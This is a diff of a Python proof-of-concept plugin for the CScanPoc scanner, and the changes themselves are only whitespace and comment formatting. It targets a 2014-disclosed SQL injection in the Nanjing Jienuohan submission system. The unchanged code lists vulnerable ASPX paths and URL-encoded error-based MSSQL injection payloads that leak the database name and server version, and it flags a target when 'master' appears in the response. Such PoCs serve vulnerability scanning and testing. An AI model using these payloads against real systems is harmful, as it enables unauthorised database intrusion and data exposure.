@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Jienuohan_0001' # 平台漏洞编号，留空
+    vuln_id = 'Jienuohan_0001'  # 平台漏洞编号，留空
     name = '南京杰诺瀚投稿系统 通用型SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-07-29'  # 漏洞公布时间
     desc = '''
         南京杰诺瀚投稿系统通，
@@ -27,6 +28,7 @@ class Vuln(ABVuln):
     product = '杰诺瀚投稿系统'  # 漏洞应用名称
     product_version = '南京杰诺瀚投稿系统'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '4f815e06-1966-4f44-8d92-0cf972eac27a'
     author = '47bwy'  # POC编写者
@@ -39,10 +41,10 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-070091
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-077673
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-082926
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-070091
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-077673
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-082926
             payloads = [
                 '/Web/Login.aspx',
                 '/web/KeySearch.aspx?searchid=1',
@@ -63,13 +65,13 @@ class Poc(ABPoc):
                 'Mail=1%27%2b%20convert%28int%2C%28db_name%281%29%29%29%20%2b%27',
                 'username=1%27%2b%20%28select%20convert%28int%2C%28@@version%29%29%20FROM%20syscolumns%29%20%2b%27'
             ]
-            
+
             for i in range(8):
                 verify_url = self.target + payloads[i]
                 #code, head, res, errcode, _ = curl.curl2(url,postdatas[i])
                 r = requests.get(verify_url, postdatas[i])
                 if 'master' in r.content:
-                    #security_hole(arg+payloads[i])
+                    # security_hole(arg+payloads[i])
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -78,6 +80,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
